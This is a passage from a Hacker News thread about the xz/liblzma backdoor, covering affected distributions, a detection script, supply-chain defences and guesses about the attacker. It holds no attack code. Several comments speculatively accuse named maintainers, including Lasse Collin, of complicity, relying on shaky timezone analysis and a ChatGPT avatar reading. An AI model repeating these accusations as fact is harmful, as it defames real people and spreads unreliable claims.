that can't be properly audited, we would be fucked; I just hope this is not already happening, because the attack surface in all those devices and appliances out there running closed code is huge. | | --- | --- | --- | | | |  |  | [perryizgr8](user?id=perryizgr8) [9 months ago](item?id=39880606)   | [prev](#39873259) | [next](#39873089) [–]  Why are projects like xz and sshd still active? Just freeze it, it works fine. Only changes should be fixes for vulnerabilities. None of this complicated new functionality. If you want something like that make a new project. If it is truly better people will use it. | | --- | --- | --- | | | |  |  | [dfgdfg34545456](user?id=dfgdfg34545456) [9 months ago](item?id=39873089)   | [prev](#39880606) | [next](#39869956) [–]  chmod u+x running detect\_sh script just runs with no output on my arch linux box? <https://www.openwall.com/lists/oss-security/2024/03/29/4> | | --- | --- | --- | | | |  |  | [Hackbraten](user?id=Hackbraten) [9 months ago](item?id=39873392)   | [parent](#39873089) | [next](#39876896) [–]  Yes, Arch Linux’s OpenSSH binary doesn’t even link to liblzma, which means your installation is not affected by this particular backdoor. The authors of the `detect\_sh` script didn’t have that scenario in mind, so the `ldd` invocation never finds a link and the script bails early without a message. | | --- | --- | --- | | | |  |  | [dfgdfg34545456](user?id=dfgdfg34545456) [9 months ago](item?id=39873982)   | [root](#39873089) | [parent](#39873392) | [next](#39876896) [–]  Thanks! | | --- | --- | --- | | | |  |  | [77pt77](user?id=77pt77) [9 months ago](item?id=39876896)   | [parent](#39873089) | [prev](#39873392) | [next](#39869956) [–]  remove the -e option on the script and run it. Anyway, arch is not affected because they don't modify openssh to link against any of this nonesense. | | --- | --- | --- | | | |  |  | [notmysql\_](user?id=notmysql_) [9 months ago](item?id=39869956)   | [prev](#39873089) | [next](#39871044) [–]  Interestingly on of the accounts that the GitHub account who introduced the backdoor follows was suspended very recently [1] who is also part of the org who runs XZ [1] <https://github.com/JiaT75?tab=following> | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39870461)   | [parent](#39869956) | [next](#39871044) [–]  That JiaT75 account is also suspended, if you check <https://github.com/Larhzu?tab=following> you'll see that they're suspended as well. It's pretty weird that it's that hard to find out whether a user is suspended. | | --- | --- | --- | | | |  |  | [west0n](user?id=west0n) [9 months ago](item?id=39871044)   | [prev](#39869956) | [next](#39874954) [–]  It seems that to counter this type of supply chain attack, the best practices for managing software dependencies are to pin the version numbers of dependencies instead of using `latest`, and to use static linking instead of dynamic linking. | | --- | --- | --- | | | |  |  | [hypnagogic](user?id=hypnagogic) [9 months ago](item?id=39874954)   | [prev](#39871044) | [next](#39902194) [–]  In the future: automated `diff` or any other A/B check to see whether or not the tarball matches the source repo (if not, auto-flag with a mismatch warning attribute), is that feasible to implement? | | --- | --- | --- | | | |  |  | [bicepjai](user?id=bicepjai) [9 months ago](item?id=39902194)   | [prev](#39874954) | [next](#39873010) [–]  For someone who does not understand the packages used, could you please summarize in layman non technical terms. Thanks I did read the main post. | | --- | --- | --- | | | |  |  | [bicepjai](user?id=bicepjai) [9 months ago](item?id=39902232)   | [parent](#39902194) | [next](#39873010) [–]  This link helped a little. [https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78b...](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27) | | --- | --- | --- | | | |  |  | [bicepjai](user?id=bicepjai) [9 months ago](item?id=39912045)   | [root](#39902194) | [parent](#39902232) | [next](#39903568) [–]  This is perfect summary <https://research.swtch.com/xz-timeline> | | --- | --- | --- | | | |  |  | [ui2RjUen875bfFA](user?id=ui2RjUen875bfFA) [9 months ago](item?id=39903568)   | [root](#39902194) | [parent](#39902232) | [prev](#39912045) | [next](#39873010) [–]  i added there something about a possible planned kernel attack which not mentioned so much yet. [https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78b...](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5008999#gistcomment-5008999) | | --- | --- | --- | | | |  |  | [itsTyrion](user?id=itsTyrion) [9 months ago](item?id=39873010)   | [prev](#39902194) | [next](#39878157) [–]  that's... creative. and patient. 11/10 concerning - now I'm wondering how many other projects could have shit like this in them or added right as I'm writing this *shudder* | | --- | --- | --- | | | |  |  | [wowserszzzzz](user?id=wowserszzzzz) [9 months ago](item?id=39878157)   | [prev](#39873010) | [next](#39871319) [–]  Wow <https://ubuntu.com/security/notices/USN-5378-2> | | --- | --- | --- | | | |  |  | [fwungy](user?id=fwungy) [9 months ago](item?id=39871319)   | [prev](#39878157) | [next](#39870535) [–]  Brain fart: would it be possible to attach passwords to a crypto based micro transaction such that every time you attempted a password entry your crypto account was charged a small fee for the login attempt? This would thwart brute force attacks, but not be a significant cost for users. If you could attach your login to the crypto account it would mean the account would have to be funded to allow the attempt. The token wouldn't store passwords it would just be a gatekeeper to the login attempt. The fees would be paid to the service providers as mining fees. E.g. foo@bar.com needs a password and a token provided from a designated crypto address to gain access to the service. | | --- | --- | --- | | | |  |  | [neoneye2](user?id=neoneye2) [9 months ago](item?id=39870535)   | [prev](#39871319) | [next](#39867464) [–]  Damn. I'm on macOS and use homebrew. To my surprise I had "xz" version 6.5.1 installed on my computer! I ran "brew upgrade" and that downgraded to version 5.4.6. | | --- | --- | --- | | | |  |  | [LeoPanthera](user?id=LeoPanthera) [9 months ago](item?id=39867464)   | [prev](#39870535) | [next](#39871278) [–]  xz is just a horribly designed format, and always has been. If you use it, please switch to Lzip. Same compression level, but designed by someone competent. <https://www.nongnu.org/lzip/> <https://www.nongnu.org/lzip/xz_inadequate.html> | | --- | --- | --- | | | |  |  | [psi-jack](user?id=psi-jack) [9 months ago](item?id=39932993)   | [parent](#39867464) | [next](#39874878) [–]  Be an asshole elsewhere. This makes me LESS want to use lzip because of such aggressive non-useful slander and just plain nonsense. | | --- | --- | --- | | | |  |  | [someguydave](user?id=someguydave) [9 months ago](item?id=39874878)   | [parent](#39867464) | [prev](#39932993) | [next](#39929713) [–]  Thanks for that link, lzip sounds useful | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39929713)   | [parent](#39867464) | [prev](#39874878) | [next](#39871278) [–]  Someone competent? More like a drama queen butthurt that his pet project did not win the popularity contest. Not the kind of person I want to rely on for important tools. | | --- | --- | --- | | | |  |  | [bitwize](user?id=bitwize) [9 months ago](item?id=39871278)   | [prev](#39867464) | [next](#39873231) [–]  Looks like Jonathan Blow was right about open source. | | --- | --- | --- | | | |  |  | [user20180120](user?id=user20180120) [9 months ago](item?id=39873231)   | [prev](#39871278) | [next](#39874197) [–]  Why is the Long Range Zip lrzip compression format not used? It gives better compression than xz when using the correct switches. | | --- | --- | --- | | | |  |  | [zingelshuher](user?id=zingelshuher) [9 months ago](item?id=39874197)   | [prev](#39873231) | [next](#39872647) [–]  Why isn't he identified personally? Very likely he is 'contributing' to other projects under different accounts. | | --- | --- | --- | | | |  |  | [jum4](user?id=jum4) [9 months ago](item?id=39872647)   | [prev](#39874197) | [next](#39870598) [–]  Maybe @JiaT75 got forced to do it. Maybe someone has more personal contact with him and can check how he is doing. | | --- | --- | --- | | | |  |  | [andix](user?id=andix) [9 months ago](item?id=39870598)   | [prev](#39872647) | [next](#39873919) [–]  Is there already a list of distributions that included the affected versions in non-prereelase channels? | | --- | --- | --- | | | |  |  | [illusive4080](user?id=illusive4080) [9 months ago](item?id=39870780)   | [parent](#39870598) | [next](#39873919) [–]  None that I could find have included it. Not even NixOS 23.11. | | --- | --- | --- | | | |  |  | [inevitable112](user?id=inevitable112) [9 months ago](item?id=39873919)   | [prev](#39870598) | [next](#39868454) [–]  Surely the real target of this was Tor (which links liblzma) not random SSH servers. | | --- | --- | --- | | | |  |  | [MaximilianEmel](user?id=MaximilianEmel) [9 months ago](item?id=39868454)   | [prev](#39873919) | [next](#39873108) [–]  Has this affected OpenBSD at all? | | --- | --- | --- | | | |  |  | [ikmckenz](user?id=ikmckenz) [9 months ago](item?id=39869211)   | [parent](#39868454) | [next](#39873108) [–]  Seems the backdoor relied on Debian and others patching their copies of openssh to support systemd notifications, and this would obviously not be the case on OpenBSD. To be sure the current ports version of xz is 5.4.5: [https://cvsweb.openbsd.org/cgi-bin/cvsweb/~checkout~/ports/a...](https://cvsweb.openbsd.org/cgi-bin/cvsweb/~checkout~/ports/archivers/xz/Makefile?rev=1.50&content-type=text/plain) Although the maintainer was working on updating to 5.6.1, but this news broke before the diff was landed: <https://marc.info/?l=openbsd-ports&m=171174441521894&w=2> | | --- | --- | --- | | | |  |  | [imanhodjaev](user?id=imanhodjaev) [9 months ago](item?id=39873108)   | [prev](#39868454) | [next](#39869228) [–]  I wonder which browsers link liblzma and can this lead to https eavesdropping? | | --- | --- | --- | | | |  |  | [nateskulic](user?id=nateskulic) [9 months ago](item?id=39869228)   | [prev](#39873108) | [next](#39872020) [–]  Fairly deep bugs for a Bazaar. | | --- | --- | --- | | | |  |  | [shp0ngle](user?id=shp0ngle) [9 months ago](item?id=39872020)   | [prev](#39869228) | [next](#39868264) [–]  we should take this diagram and change "random person in nebraska" to "possibly a state-level attacker" <https://xkcd.com/2347/> nice | | --- | --- | --- | | | |  |  | [elintknower](user?id=elintknower) [9 months ago](item?id=39868264)   | [prev](#39872020) | [next](#39876027) [–]  Candidly how would someone protect against a vulnerability like this? | | --- | --- | --- | | | |  |  | [devttyeu](user?id=devttyeu) [9 months ago](item?id=39871028)   | [parent](#39868264) | [next](#39869288) [–]  Build from source AND run an Ai agent that reviews every single line of code you compile (while hoping that the any potential exploit doesn’t also fool / exploit your AI agent) | | --- | --- | --- | | | |  |  | [anononaut](user?id=anononaut) [9 months ago](item?id=39869288)   | [parent](#39868264) | [prev](#39871028) | [next](#39876027) [–]  Compile all your packages from source would be a start. | | --- | --- | --- | | | |  |  | [Hackbraten](user?id=Hackbraten) [9 months ago](item?id=39870740)   | [root](#39868264) | [parent](#39869288) | [next](#39876027) [–]  You’re not wrong. However, building from source wouldn’t have protected you against this specific backdoor. The upstream source tarball itself was compromised in a cleverly sneaky way. | | --- | --- | --- | | | |  |  | [ui2RjUen875bfFA](user?id=ui2RjUen875bfFA) [9 months ago](item?id=39870894)   | [root](#39868264) | [parent](#39870740) | [next](#39874052) [–]  You might read <https://www.openwall.com/lists/oss-security/2024/03/29/4> "However, building from source wouldn’t have protected you against this specific backdoor." Depends on how exactly you build from source. A generic build was not the target. Andres Freund showed that the attack was targeted against a specific type of build system. | | --- | --- | --- | | | |  |  | [zamalek](user?id=zamalek) [9 months ago](item?id=39874052)   | [root](#39868264) | [parent](#39870740) | [prev](#39870894) | [next](#39876027) [–]  Building from git, or the github automatic tarball would have. The larger issue here is authenticating tarballs against the source. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39939787)   | [root](#39868264) | [parent](#39874052) | [next](#39876027) [–]  There is no reason to believe the exploit would have been spotted earlier had the attacker included the final part in git. | | --- | --- | --- | | | |  |  | [evilmonkey19](user?id=evilmonkey19) [9 months ago](item?id=39876027)   | [prev](#39868264) | [next](#39870998) [–]  Which OS are affected by this compromise?? Is Ubuntu affected? | | --- | --- | --- | | | |  |  | [betaby](user?id=betaby) [9 months ago](item?id=39870998)   | [prev](#39876027) | [next](#39870524) [–]  How that backdoor is triggered and what exactly it does? | | --- | --- | --- | | | |  |  | [xvilka](user?id=xvilka) [9 months ago](item?id=39870524)   | [prev](#39870998) | [next](#39870208) [–]  Maybe it's finally time to start sunsetting LZMA and xz all together in favor of newer algorithms like Zstandard that also offer better performance but compression rates on par with LZMA. | | --- | --- | --- | | | |  |  | [illusive4080](user?id=illusive4080) [9 months ago](item?id=39870814)   | [parent](#39870524) | [next](#39870208) [–]  Yes but don’t start thinking they’re immune to compromise | | --- | --- | --- | | | |  |  | [xvilka](user?id=xvilka) [9 months ago](item?id=39871260)   | [root](#39870524) | [parent](#39870814) | [next](#39870208) [–]  Nobody is. But it's a great opportunity window. | | --- | --- | --- | | | |  |  | [llmblockchain](user?id=llmblockchain) [9 months ago](item?id=39870208)   | [prev](#39870524) | [next](#39875919) [–]  Was Debian 12/stable unaffected? Only sid? | | --- | --- | --- | | | |  |  | [joshhansen](user?id=joshhansen) [9 months ago](item?id=39882240)   | [parent](#39870208) | [next](#39875919) [–]  My understanding is that that's correct. I'm on fully upgraded stable (Debian 12) and my xz is 5.4.2 and liblzma as well. | | --- | --- | --- | | | |  |  | [hypnagogic](user?id=hypnagogic) [9 months ago](item?id=39875919)   | [prev](#39870208) | [next](#39874289) [–]  - \* \_ring ring\_ \* - "Hello?" - "It's Lasse Collin." - "Why are you collin me? Why not just use the backdoor?" | | --- | --- | --- | | | |  |  | [pinley](user?id=pinley) [9 months ago](item?id=39874289)   | [prev](#39875919) | [next](#39873971) [–]  <https://imgur.com/WGaK3Tn> | | --- | --- | --- | | | |  |  | [KOLANICH](user?id=KOLANICH) [9 months ago](item?id=39873971)   | [prev](#39874289) | [next](#39872282) [–]  Please note: the changes have been made after GitHub has enforced 2FA (certainly not for "better security", but for promotion of FIDO2 and Windows Hello biometric impl of FIDO2, see <https://codeberg.org/KOLANICH/Fuck-GuanTEEnomo> for more info. Until recent times (for now access via git protocol is blocked for my acc, I guess based on lack of 2FA set up) it was even possible to push into all repos one has access by just using single-factor SSH key even without enabling 2FA in the account). As I have warned, nothing will protect when a backdoor is introduced by a malicious maintainer, or a "smart entrepreneur" who sold his project to a ad-company, or a loyal "patriot" living and earning money within reach of some state, or just a powerless man who got an offer he can't refuse. In general supply chain attacks by "legitimate" maintainers cannot be prevented. "Jia Tan" is just a sockpuppet to mitigate consequences to maintainers to make it look like they are not involved into it. They surely are. At least according to the current info it were they who have given the malicious account the permission to publish releases on behalf of the project and access to the repo. IMHO all maintainers of the backdooored projects anyhow related to accepting the malicious changes should be considered as accomplices and boycotted. We don't need evidence of their liability, it is they who need to maintain their reputation. We are just free to take our decisions based on their reputation. Even if they were hacked themselves, it is not our problem, it is their problem. Our problem is to keep ourselves safe. It may feel "unjust" to ruin reputation of a person based on the fact he may be cheated or hacked… But if a person can be cheated or hacked, why should he/she have such a good reputation as everyone else?! So, it makes a lot of sense to just exclude and replace everyone, for whome there exists evidence of comprometation, no matter due to unconcern or malice. But FOSS is a doocracy serving products at dumpling prices ($0, free of charge), and for majority backdoored software is completely acceptable given that they get them free of charge. And powerful actors who can afford to pay for software will just hire devs to develop their private versions, while allowing the public to pay $0 for their free versions and use the backdoors placed into them themselves. In other words a complete market failure. I think that 1. xz project must be shut down completely. I mean projects should stop using it as a dependency, exclude from distros, boycott it. LZMA algo was developed by Igor Pavlov in 7z project, but somehow it has happenned that liblzma was developed and maintained by unrelated folks. liblzma should be developed as a part of 7z project taking no code other than the trivial one for API compatibility adapter from xz. 2. Projects created by compromised authkrs should be boycotted. 3. Other projects touched by the compromised devs/maintainers should be audited. 4. All the projects using autotools should be audited and must replace autotools with cmake/meson. Autotools is a piece of shit, completely uncomprehensible. There is no surprise it was used to hude a backdoor - according to my experience in FOSS noone likes to touch its scripts anyhow. 5. No project should be built from releases. Project should be built from git directly. Implementing full support of SHA256 in git and git forges (GitHub, GitLab, Codeberg, sr.ht) should be accelerated to mitigate attacks using collisions to replace approved commits (I guess the randomness can be concealed from reviewer's eye in binary resource files, like pictures). | | --- | --- | --- | | | |  |  | [Rhea\_Karty](user?id=Rhea_Karty) [9 months ago](item?id=39872282)   | [prev](#39873971) | [next](#39869272) [–]  TLDR: Some people have been throwing around “China,” but it seems also quite possible that Jia is from somewhere in Eastern Europe pretending to be from China. In addition, Lasse Collin and Hans Jansen are from the same EET time zone. These are my notes on time stamps/zones. There are a few interesting bits that I haven't fully fleshed out. The following analysis was conducted on JiaT75’s ([https://github.com/JiaT75?tab=overview&from=2021-12-01&to=20...](https://github.com/JiaT75?tab=overview&from=2021-12-01&to=2021-12-31)) commits to the XZ repository, and their time stamps. Observation 1: Time zone basic analysis Here is the data on Jia’s time zone and the number of times he was recorded in that time zone: 3: + 0200 (in winter: February and November) 6: +0300 (in summer: in Jun, Jul, early October) 440: +0800 1. The +800 is likely CST. China (or Indonesia or Philippines), given that Australia does daylight savings time and almost no one lives in Siberia and the Gobi dessert. 2. The +0200/+0300, if we are assuming that this is one location, is likely on EET (Finland, Estonia, Latvia, Lithuania, Ukraine, Moldavia, Romania, Bulgaria, Greece, Turkey). This is because we see a switch from +300 in the winter (past the last weekend of October) and +200 in the summer (past the last Sunday in March). Incidentally, this seems to be the same time zone as Lasse Collin and Hans Jansen… Observation 2: Time zone inconsistencies Let’s analyze the few times where Jia was recorded in a non +800 time zone. Here, we notice that there are some situations where Jia switches between +800 and +300/+200 in a seemingly implausible time. Indicating that perhaps he is not actually in +800 CST time, as his profile would like us to believe. Jia Tan Tue, 27 Jun 2023 23:38:32 +0800 —> 23:38 + 8 = 7:30 (+ 1) Jia Tan Tue, 27 Jun 2023 17:27:09 +0300 —> 17:27 + 3 = 20:30 —> about a 9 hour difference, but flight from China to anywhere in Eastern Europe is at a min 10 hours Jia Tan Thu, 5 May 2022 20:53:42 +0800 Jia Tan Sat, 19 Nov 2022 23:18:04 +0800 Jia Tan Mon, 7 Nov 2022 16:24:14 +0200 Jia Tan Sun, 23 Oct 2022 21:01:08 +0800 Jia Tan Thu, 6 Oct 2022 21:53:09 +0300 —> 21:53 + 3 = 1:00 (+1) Jia Tan Thu, 6 Oct 2022 17:00:38 +0800 —> 17:00 + 8 = 1:00 (+1) Jia Tan Wed, 5 Oct 2022 23:54:12 +0800 Jia Tan Wed, 5 Oct 2022 20:57:16 +0800 —> again, given the flight time, this is even more impossible Jia Tan Fri, 2 Sep 2022 20:18:55 +0800 Jia Tan Thu, 8 Sep 2022 15:07:00 +0300 Jia Tan Mon, 25 Jul 2022 18:30:05 +0300 Jia Tan Mon, 25 Jul 2022 18:20:01 +0300 Jia Tan Fri, 1 Jul 2022 21:19:26 +0800 Jia Tan Thu, 16 Jun 2022 17:32:19 +0300 Jia Tan Mon, 13 Jun 2022 20:27:03 +0800 —> the ordering of these time stamps, and the switching back and forth looks strange. Jia Tan Thu, 15 Feb 2024 22:26:43 +0800 Jia Tan Thu, 15 Feb 2024 01:53:40 +0800 Jia Tan Mon, 12 Feb 2024 17:09:10 +0200 Jia Tan Mon, 12 Feb 2024 17:09:10 +0200 Jia Tan Tue, 13 Feb 2024 22:38:58 +0800 —> this travel time is possible, but the duration of stay is unlikely Observation 3: Strange record of time stamps It seems that from the commits, often the time stamps are out of order. I am not sure what would cause this other than some tampering. Observation 4: Bank holiday inconsistencies We notice that Jia’s work schedule and holidays seem to align much better with an Eastern European than a Chinese person. Disclaimer: I am not an expert in Chinese holidays, so this very well could be inaccurate. I am referencing this list of bak holidays:([https://www.bankofchina.co.id/en-id/service/information/late...](https://www.bankofchina.co.id/en-id/service/information/latest-news/2022/public-holidays-in-china-hk-and-the-us-in-2023.html)) Chinese bank holidays (just looking at 2023): - Working on 2023, 29 September: Mid Autumn Festival - Working on 2023, 05 April: Tomb Sweeping Day - Working on 2023, 26, 22, 23, 24, 26, 27 Jan: Lunar New Year Eastern European holidays: - Never working on Dec 25: Christmas (for many EET countries) - Never working Dec 31 or Jan 1: New Years Observation 5: No weekend work —> salary job? The most common working days for Jia was Tue (86), Wed (85), Thu (89), and Fri (79). If we adjust his time zone to be EET, then that means he is usually working 9 am to 6 pm. This makes much more sense than someone working at midnight and 1 am on a Tuesday night. These times also line up well with Hans Jansen and Lasse Collin. I think it is more likely that Jia does this as part of his work… somewhere in Eastern Europe. Likely working with, or in fact being one and the same as, Hans Jansen and Lasse Collin. | | --- | --- | --- | | | |  |  | [frenchman99](user?id=frenchman99) [9 months ago](item?id=39873078)   | [parent](#39872282) | [next](#39881483) [–]  You say yourself that the time data could be tampered. It's trivial to change commit dates in git. So this analysis means nothing by itself, unfortunately. | | --- | --- | --- | | | |  |  | [mimop](user?id=mimop) [9 months ago](item?id=39874737)   | [root](#39872282) | [parent](#39873078) | [next](#39881483) [–]  I wouldn't say that. This guy seems to have tried hard to appear Chinese (and possibly tampered the time stamps this way) – but based on that analysis, it seems plausible they did a bad job and were actually based out of Eastern Europe. | | --- | --- | --- | | | |  |  | [bed99](user?id=bed99) [9 months ago](item?id=39881483)   | [parent](#39872282) | [prev](#39873078) | [next](#39872994) [–]  I asked ChatGPT 4 based on Jia's Github avatar image: The timezones that ChatGPT thinks the avatar comes from aligns with +2 and +3, see what how it ranked and at the end the description of Jia's avatar: --- Rank, Score, Country, City, Timezone, Criteria 1, 10, Saudi Arabia, Mecca, AST (UTC+3), Heartland of Islam, deeply rooted calligraphic traditions. 2, 9.5, Iran, Tehran, IRST (UTC+3:30), Integral Persian calligraphy with a distinct style and history. 3, 9, Turkey, Istanbul, TRT (UTC+3), Historical significance of Ottoman calligraphy, actively preserved. 4, 8.5, Egypt, Cairo, EET (UTC+2), Home to Al-Azhar University, with calligraphy in the curriculum. 5, 8, Morocco, Marrakech, WET (UTC+0), Calligraphy integrated into architecture and crafts. 6, 7.5, United Arab Emirates, Abu Dhabi, GST (UTC+4), Promotes Islamic arts through festivals and museums. 7, 7, Syria, Damascus, EET (UTC+2), Historical center of Arabic calligraphy, despite recent conflicts. 8, 6.5, Pakistan, Islamabad, PKT (UTC+5), Rich tradition, hosts several institutions and events dedicated to calligraphy. 9, 6, Indonesia, Jakarta, WIB (UTC+7), Largest Muslim-majority country with calligraphy in art and monuments. 10, 5.5, Spain, Cordoba, CET (UTC+1), Legacy of Islamic culture and appreciation for calligraphy, particularly in Andalusia. -- GPT4: This image appears to be a stylized representation of the letter 'J' within an intricate border, possibly inspired by the art style of Islamic calligraphy. The ornate background is typical of arabesque patterns, which are characteristic of Islamic art and consist of repeating geometric forms that often echo the shapes of plants, flowers, and sometimes calligraphic writing. The letter 'J' stands out in a vibrant yellow, contrasting with the dark green of the surrounding design. | | --- | --- | --- | | | |  |  | [Rhea\_Karty](user?id=Rhea_Karty) [9 months ago](item?id=39886672)   | [root](#39872282) | [parent](#39881483) | [next](#39872994) [–]  Interesting :). However, I think that EET is the only time zone that works. (This is mostly because is seems that the area follows DST, which most non western countries in the worlf do not). | | --- | --- | --- | | | |  |  | [mborch](user?id=mborch) [9 months ago](item?id=39872994)   | [parent](#39872282) | [prev](#39881483) | [next](#39876558) [–]  This 2011 addition to the XZ Utils Wikipedia page is interesting because a) why is this relevant, b) who is Mike Kezner since he's not mentioned on the Tukaani project page (<https://tukaani.org/about.html>) under "Historical acknowledgments". [https://en.wikipedia.org/w/index.php?title=XZ\_Utils&diff=pre...](https://en.wikipedia.org/w/index.php?title=XZ_Utils&diff=prev&oldid=465045943) Arch Linux played an important role in making this compression software trusted and depended upon. Perhaps not a coincidence, but at the very least, such a big project should more carefully consider the software they distribute and rely on, whether it's worth the risk. | | --- | --- | --- | | | |  |  | [ui2RjUen875bfFA](user?id=ui2RjUen875bfFA) [9 months ago](item?id=39873451)   | [root](#39872282) | [parent](#39872994) | [next](#39893461) [–]  > Arch Linux played an important role in making this compression software trusted and depended upon. because of the way arch distributes packages? then what you think about freebsd? | | --- | --- | --- | | | |  |  | [prissy04](user?id=prissy04) [9 months ago](item?id=39893461)   | [root](#39872282) | [parent](#39872994) | [prev](#39873451) | [next](#39876558) [–]  If you check the history of that IP address, it added Mike Kezner to other pages. No clue why. | | --- | --- | --- | | | |  |  | [Rhea\_Karty](user?id=Rhea_Karty) [9 months ago](item?id=39876558)   | [parent](#39872282) | [prev](#39872994) | [next](#39869272) [–]  Made a more detailed write-up on this: [https://rheaeve.substack.com/p/xz-backdoor-times-damned-time...](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and) | | --- | --- | --- | | | |  |  | [alathers](user?id=alathers) [9 months ago](item?id=39869272)   | [prev](#39872282) | [next](#39874669) [–]  Thank the gods I didn't plan on having a life this weekend | | --- | --- | --- | | | |  |  | [7ero](user?id=7ero) [9 months ago](item?id=39874669)   | [prev](#39869272) | [next](#39883403) [–]  Is this sev0? | | --- | --- | --- | | | |  |  | [krascovict](user?id=krascovict) [9 months ago](item?id=39883403)   | [prev](#39874669) | [next](#39867713) [–]  Hello everybody. I am taking the initiative to gather more information regarding the possible precursors and perpetrators of the backdoor. The purpose of this commentary is focused on open source information (OSINT). I am not a judge of anyone or any action that may occur, the objective of this comment is to help through accurate and quick information to help the core developers of the affected packages and consequently the Linux kernel (which may have been indirectly or directly affected) take action necessary in relation to the fact that occurred. NOTE: This comment will always have "edit" so always review it for information. Information I have so far. Summary: 1. GitHub Account Suspension: - The accounts of @JiaT75 and @Larhzu were suspended by GitHub. - All Tukaani repositories, including downloads, were disabled. - Investigate the cause of the account suspensions and whether there is any correlation with suspicious activities. 2. Possible Backdoor in xz/liblzma: - There are concerns about the presence of a backdoor in xz/liblzma. - Investigate whether there is evidence of compromise in the source code and recent updates. - Examine potential impacts, especially if the software is used in critical systems. 3. Updates and Patches in Packages: - Note recent updates in packages such as MinGW w64, pacman-static, Alpine, and OpenSUSE. - Review changelogs to understand if these updates are related to security fixes. 4. Jia's Activities on Platforms and Projects: - Investigate Jia's contributions to different projects and platforms, such as Arch Linux, Alpine Linux, and OpenSUSE. - Check for correlations between Jia's activities and reported security issues. 5. Libera Registration Information: - Analyze Jia's registration details on Libera to determine the timeline of their online activities. - Consider correlating this information with other online activities of Jia. 6. VPN Usage: - Confirm Jia's use of VPN and assess its impact on security investigations. - Explore possible reasons for using a VPN and how it may affect the identification and tracking of online activities. Links related to user JiaT75 [xz] Remove JiaT75 as a contact, determine correct contacts #11760 - Google/oss-fuzz <https://github.com/google/oss-fuzz/issues/11760> Tuktest index hash #7 - tukaani-project/xz/pull/7 [https://web.archive.org/web/20240329230522/https://github.co...](https://web.archive.org/web/20240329230522/https%3A//github.com/tukaani-project/xz/pull/7) | | --- | --- | --- | | | |  |  | [xyst](user?id=xyst) [9 months ago](item?id=39867713)   | [prev](#39883403) | [next](#39874664) [–]  Time for another OS wipe. Glad I keep bleeding edge versions VMd | | --- | --- | --- | | | |  |  | [7ero](user?id=7ero) [9 months ago](item?id=39874664)   | [prev](#39867713) | [next](#39868362) [–]  is this sev0? | | --- | --- | --- | | | |  |  | [kosolam](user?id=kosolam) [9 months ago](item?id=39868362)   | [prev](#39874664) | [next](#39873098) [–]  Jesus! Does anyone know if Debian stable is affected? | | --- | --- | --- | | | |  |  | [djao](user?id=djao) [9 months ago](item?id=39871420)   | [parent](#39868362) | [next](#39868618) [–]  The stable releases don't have this particular backdoor, but they're still using older versions of the library that were released by the same bad actor. | | --- | --- | --- | | | |  |  | [ValdikSS](user?id=ValdikSS) [9 months ago](item?id=39868618)   | [parent](#39868362) | [prev](#39871420) | [next](#39873098) [–]  It's not. Neither Ubuntu. | | --- | --- | --- | | | |  |  | [anononaut](user?id=anononaut) [9 months ago](item?id=39869292)   | [root](#39868362) | [parent](#39868618) | [next](#39873098) [–]  Do you have a source my friend? I thought Ubuntu was built off of Debian testing or unstable | | --- | --- | --- | | | |  |  | [ValdikSS](user?id=ValdikSS) [9 months ago](item?id=39870473)   | [root](#39868362) | [parent](#39869292) | [next](#39873098) [–]  The latest version in 23.10 is 5.4.1-0.2 <https://packages.ubuntu.com/mantic/liblzma5> And in unreleased 24.04 is 5.4.5-0.3 <https://packages.ubuntu.com/noble/liblzma5> There are no changelog entries indicating that the package was reverted. | | --- | --- | --- | | | |  |  | [imanhodjaev](user?id=imanhodjaev) [9 months ago](item?id=39873098)   | [prev](#39868362) | [next](#39872257) [–]  now I wonder which browsers link liblzma? | | --- | --- | --- | | | |  |  | [Rhea\_Karty](user?id=Rhea_Karty) [9 months ago](item?id=39872257)   | [prev](#39873098) | [next](#39868412) [–]  Notes on time stamps and time zones. A few interesting bits that I haven't fully fleshed out. TLDR: Some people have been throwing around that Jia is from “China,” but it seems also quite possible that Jia is from somewhere in Eastern Europe pretending to be from China. In addition, Lasse Collin and Hans Jansen are from the same EET time zone. The following analysis was conducted on JiaT75’s ([https://github.com/JiaT75?tab=overview&from=2021-12-01&to=20...](https://github.com/JiaT75?tab=overview&from=2021-12-01&to=2021-12-31)) commits to the XZ repository, and their time stamps. Observation 1: Time zone basic analysis Here is the data on Jia’s time zone and the number of times he was recorded in that time zone: 3: + 0200 (in winter: February and November) 6: +0300 (in summer: in Jun, Jul, early October) 440: +0800 1. The +800 is likely CST. China (or Indonesia or Philippines), given that Australia does daylight savings time and almost no one lives in Siberia and the Gobi dessert. 2. The +0200/+0300, if we are assuming that this is one location, is likely on EET (Finland, Estonia, Latvia, Lithuania, Ukraine, Moldavia, Romania, Bulgaria, Greece, Turkey). This is because we see a switch from +300 in the winter (past the last weekend of October) and +200 in the summer (past the last Sunday in March). 1. Incidentally, this seems to be the same time zone as Lasse Collin and Hans Jansen… Observation 2: Time zone inconsistencies Let’s analyze the few times where Jia was recorded in a non +800 time zone. Here, we notice that there are some situations where Jia switches between +800 and +300/+200 in a seemingly implausible time. Indicating that perhaps he is not actually in +800 CST time, as his profile would like us to believe. Jia Tan Tue, 27 Jun 2023 23:38:32 +0800 —> 23:38 + 8 = 7:30 (+ 1) Jia Tan Tue, 27 Jun 2023 17:27:09 +0300 —> 17:27 + 3 = 20:30 —> about a 9 hour difference, but a flight from China to anywhere in Eastern Europe is at a min 10 hours Jia Tan Thu, 5 May 2022 20:53:42 +0800 Jia Tan Sat, 19 Nov 2022 23:18:04 +0800 Jia Tan Mon, 7 Nov 2022 16:24:14 +0200 Jia Tan Sun, 23 Oct 2022 21:01:08 +0800 Jia Tan Thu, 6 Oct 2022 21:53:09 +0300 —> 21:53 + 3 = 1:00 (+1) Jia Tan Thu, 6 Oct 2022 17:00:38 +0800 —> 17:00 + 8 = 1:00 (+1) Jia Tan Wed, 5 Oct 2022 23:54:12 +0800 Jia Tan Wed, 5 Oct 2022 20:57:16 +0800 —> again, given the flight time, this is even more impossible Jia Tan Fri, 2 Sep 2022 20:18:55 